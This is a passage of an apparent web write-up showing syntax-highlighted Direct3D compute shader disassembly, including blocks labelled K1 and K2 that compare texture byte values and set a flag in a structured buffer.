</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>9</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>z</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>10</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>11</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>12</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>y</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>13</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>z</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>14</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>15</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ret</span><span class=w> 
</span></span></span></code></pre></td></tr></table></div></div><p>K1:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>cs_5_0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_globalFlags</span><span class=w> </span><span class=n>refactoringAllowed</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nf>dcl_resource_texture2d</span><span class=w> </span><span class=p>(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>t0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nf>dcl_uav_typed_texture2d</span><span class=w> </span><span class=p>(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>u0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_uav_structured</span><span class=w> </span><span class=n>u1</span><span class=p>,</span><span class=w> </span><span class=n>4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_input</span><span class=w> </span><span class=n>vThreadID</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_temps</span><span class=w> </span><span class=n>2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_thread_group</span><span class=w> </span><span class=n>16</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>vThreadID</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ld_uav_typed_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xwww</span><span class=p>,</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>round_ne</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ftou</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>and</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>iadd</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>vThreadID</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>and</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ld_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>t0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>round_ne</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ftou</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ine</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>if_nz</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>store_structured</span><span class=w> </span><span class=n>u1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>endif</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ret</span><span class=w> 
</span></span></span></code></pre></td></tr></table></div></div><p>K2:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>dcl_globalFlags</span><span class=w> </span><span class=n>refactoringAllowed</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_constantbuffer</span><span class=w> </span><span class=n>CB0</span><span class=o>[</span><span class=n>2</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>immediateIndexed</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_sampler</span><span class=w> </span><span class=n>s0</span><span class=p>,</span><span class=w> </span><span class=n>mode_default</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nf>dcl_resource_texture2d</span><span class=w> </span><span class=p>(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>t0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nf>dcl_resource_texture2d</span><span class=w> </span><span class=p>(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>t1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nf>dcl_uav_typed_texture2d</span><span class=w> </span><span class=p>(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>u0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_uav_structured</span><span class=w> </span><span class=n>u1</span><span class=p>,</span><span class=w> </span><span class=n>4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_input</span><span class=w> </span><span class=n>vThreadID</span><span class=p>.</span><span class=na>xy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_temps</span><span class=w> </span><span class=n>4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_thread_group</span><span class=w> </span><span class=n>8</span><span class=p>,</span><span class=w> </span><span class=n>8</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nf>resinfo_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=n>_uint</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xy</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>uge</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>zw</span><span class=p>,</span><span class=w> </span><span class=n>vThreadID</span><span class=p>.</span><span class=na>xxxy</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xxxy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>or</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>if_nz</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>ret</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>endif</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>zw</span><span class=p>,</span><span class=w> </span><span class=n>vThreadID</span><span class=p>.</span><span class=na>yyyx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xy</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yxyy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>div</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xy</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>zwzz</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyxx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mad</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xy</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyxx</span><span class=p>,</span><span class=w> </span><span class=n>cb0</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>wzww</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=o>-</span><span class=n>0</span><span class=p>.</span><span class=na>5</span><span class=p>,</span><span class=w> </span><span class=o>-</span><span class=n>0</span><span class=p>.</span><span class=na>5</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>resinfo_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=n>_uint</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>zw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>t0</span><span class=p>.</span><span class=na>zwxy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>zw</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>wwwz</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>div</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sincos</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>cb0</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>xy</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyxx</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>xxxx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mad</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=o>-</span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mad</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>y</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>div</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>add</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yz</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>xxyx</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>.</span><span class=na>5</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>.</span><span class=na>5</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ld_structured_indexable</span><span class=p>(</span><span class=n>structured_buffer</span><span class=p>,</span><span class=w> </span><span class=n>stride</span><span class=o>=</span><span class=n>4</span><span class=p>)(</span><span class=n>mixed</span><span class=p>,</span><span class=n>mixed</span><span class=p>,</span><span class=n>mixed</span><span class=p>,</span><span class=n>mixed</span><span class=p>)</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>u1</span><span class=p>.</span><span class=na>xxxx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ieq</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>if_z</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
